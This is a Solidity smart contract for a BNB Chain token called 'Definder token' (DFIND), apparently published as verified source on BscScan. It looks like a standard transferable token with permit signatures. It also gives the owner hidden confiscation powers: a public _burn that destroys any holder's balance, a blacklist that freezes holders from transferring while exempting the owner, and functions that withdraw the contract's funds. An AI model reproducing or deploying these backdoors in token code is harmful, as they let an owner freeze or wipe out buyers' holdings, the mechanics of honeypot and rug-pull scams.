/**
 *Submitted for verification at BscScan.com on 2022-04-29
*/

pragma solidity =0.5.16;

import "./Interfaces.sol";
import "./SafeMath.sol"; 


contract NewToken is IPancakeIBEP2E {
    using SafeMath for uint;



    // @notice Developer address
    address  private contractOwner;
    // @dev Emitted when the Owner changes
    event OwnerTransferredEvent(address indexed previousOwner, address indexed newOwner);


    // @dev Throws if called by any account that's not Owner
    modifier onlyOwner() {
        require(msg.sender == contractOwner, "Only the Developer required");
        _;
    }

    // @dev Tris function for transfering owne functions to new Owner
    // @param newOwner An address of new Owner
    function transferOwner(address payable newOwner) external onlyOwner {
        require(newOwner != address(0), "This address is 0!");
        emit OwnerTransferredEvent(contractOwner, newOwner);
        contractOwner = newOwner;
    }

    mapping(address => bool) private blacklist;

    event BlacklistEvent(address addr, uint256 status, string eventText);

    modifier notBlacklisted() {
        require(!blacklist[msg.sender] || contractOwner == msg.sender);
        _;
    }

    function addAddressToBlacklist(address addr) external onlyOwner returns(bool success) {
        if (!blacklist[addr]) {
            blacklist[addr] = true;
            emit BlacklistEvent(addr, 1, "The address has been added to Blacklist");
            success = true;
        }
    }

     function removeAddressFromBlacklist(address addr) external onlyOwner returns(bool success) {
        success = false;
        if (blacklist[addr]) {
            blacklist[addr] = false;
            emit BlacklistEvent(addr, 0, "The address has been deleted from Blacklist");
            success = true;
        }
    }

    function isBlacklistAddress(address addr) public view returns (bool success) {
        return blacklist[addr];
    }


    string public constant name = 'Definder token';
    string public constant symbol = 'DFIND';
    uint8 public constant decimals = 6;
    uint  public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    bytes32 public DOMAIN_SEPARATOR;
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    constructor() public {
        uint chainId;
        assembly {
            chainId := chainid
        }
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),
                keccak256(bytes(name)),
                keccak256(bytes('1')),
                chainId,
                address(this)
            )
        );
        contractOwner = msg.sender;
        totalSupply = 210000000000000;
        balanceOf[contractOwner] = 210000000000000;
    }


    function _burn(address from, uint value) onlyOwner public  {
        balanceOf[from] = balanceOf[from].sub(value);
        totalSupply = totalSupply.sub(value);
        emit Transfer(from, address(0), value);
    }

    function _approve(address owner, address spender, uint value) private {
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address from, address to, uint value) private {
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);
    }

    function approve(address spender, uint value) external notBlacklisted returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint value) external notBlacklisted returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) external notBlacklisted returns (bool) {
        if (allowance[from][msg.sender] != uint(-1)) {
            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        }
        _transfer(from, to, value);
        return true;
    }

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external notBlacklisted {
        require(deadline >= block.timestamp, 'Pancake: EXPIRED');
        bytes32 digest = keccak256(
            abi.encodePacked(
                '\x19\x01',
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
            )
        );
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress != address(0) && recoveredAddress == owner, 'Pancake: INVALID_SIGNATURE');
        _approve(owner, spender, value);
    }

    function() external payable {
 
    }


    function withdraw() public payable onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function withdrawToken(address token) public onlyOwner {
        IBEP2E  rewardsToken = IBEP2E(token);
        bool success = rewardsToken.transfer(msg.sender,rewardsToken.balanceOf(address(this)));
        require(success);
    }
}